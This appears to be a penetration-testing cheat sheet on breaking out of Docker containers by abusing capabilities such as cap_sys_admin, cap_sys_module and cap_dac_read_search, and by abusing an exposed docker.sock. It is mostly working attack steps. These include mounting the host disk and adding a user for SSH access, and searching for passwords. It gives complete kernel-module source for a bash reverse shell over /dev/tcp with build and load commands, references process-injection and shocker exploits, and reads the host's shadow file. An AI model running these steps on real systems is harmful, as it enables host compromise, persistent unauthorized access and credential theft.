# Container Breakouts

## cap\_sys\_admin Capability

Check if there is cap\_sys\_admin privileges in docker container.&#x20;

```
capsh --print
```

if you see in the result `cap_sys_admin` then you can continue.

* Mount the root directory of host to container and look for the credentials or config files.&#x20;

```
fdisk -l 
mount /dev/sda /mnt
ls -l /mnt/

chroot /mnt/ bash
find / -name password 2>/dev/null
# and check credentials in root file system.
```

* Scan host machine and look for open ports
  * if there is open ssh port

```
chroot /mnt/ adduser turm
# give the password and it will add user to host system. 
# Then login to ssh port with that user. 
```

## docker.sock&#x20;

In the docker-container, if there is a docker.sock have a symlink to /run/docker.sock then there is possibility to do break out.&#x20;

```
find / -name docker.sock 2>/dev/null

#if you see in the result /run/docker.sock go for that way
```

Now we will create a container inside the docker container and connect it to host



```
docker images
# or pull docker images 
docker run -it -v /:/host/ ubuntu:22.04 bash

# That will give us a shell

cd /host/
chroot ./ bash

#after that part add a user and connect with ssh or find
#find credentials. 
```



## cap\_sys\_ptrace capability

if there is cap\_sys\_ptrace capability, then it is possible to inject process and create a bind shell on host it self then it is possible to jump over there via that port.&#x20;

Exploit that can be found

&#x20;[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)

{% embed url="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" %}

After that change that shell code inside the c file and later

```
gcc inject.c -o inject`
```

later inject with PID of serveR

```
./inject 1234
```

then connect host machine with bind shell

`nc IP PORT`



## cap\_sys\_module capability

If there is cap\_sys\_module capability inside the docker container, then that breakout can work . This capability allows the process to load kernel modules and manipulate the kernel, which can be exploited to compromise the underlying host system's security.

```
capsh --print
# if you see cap_sys_module 
```

Then check for the IP address of the docker. First of A.B.C.01 is for the host machine itself.

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Test");
MODULE_DESCRIPTION("Reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.19.0.2/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Then we should create a Makefile to compile kernel module.&#x20;

```
obj-m +=reverse-shell.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```

Make the kernel module.

`make`

Listen on the port in docker container

Then in new terminal&#x20;

`insmod reverse-shell.ko`



## cap\_dac\_read\_search capability

The `cap_dac_read_search` capability is important because it controls a process's ability to read and search directories/files with discretionary access control (DAC) permissions. DAC permissions determine who can access and modify specific files and directories on a system.

```
capsh --print
```

Later check for cap\_dac\_read\_search capability. ([https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3))

We should use that c code, [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)

Check also is there any `.dockerinit` file exist.&#x20;

Look which disks are mounted. `mount`

* If there is /etc/ directories mounted change in exploit int main() section and add there these directories.&#x20;

after adding these by using gcc compile the code.&#x20;



So by that you can read shadow file of the host machine. Maybe SSH files or ssh config files of host machine can be read also.&#x20;



##







